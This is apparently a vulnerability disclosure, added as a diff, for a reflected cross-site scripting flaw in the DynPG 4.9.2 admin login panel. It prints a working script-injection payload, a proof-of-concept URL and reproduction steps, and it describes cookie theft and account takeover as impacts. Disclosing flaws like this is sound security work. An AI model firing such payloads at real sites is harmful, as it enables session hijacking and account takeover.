@@ -1,0 +1,20 @@
+Description
+
+A cross-site scripting (XSS) issue in the DynPG admin login panel version 4.9.2 allows remote attackers to inject JavaScript via the "index.php" URI
+___
+XSS Payload: '"--></style></scRipt><scRipt>alert(1)</scRipt>
+___
+Vulnerable URI: index.php
+___
+Steps to Reproduce the Issue:
+
+1- Login to DynPG admin panel
+2- Paste below POC:
+https://localhost/dynpg/index.php/'"--></style></scRipt><scRipt>alert(1)</scRipt>
+
+As you can see, XSS is triggered.
+
+Video POC: 
+___
+Impact
+With the help of xss attacker can perform social engineering on users by redirecting them from real website to fake one. Attacker can steal their cookies leading to account takeover and download a malware on their system, and there are many more attacking scenarios a skilled attacker can perform with xss.
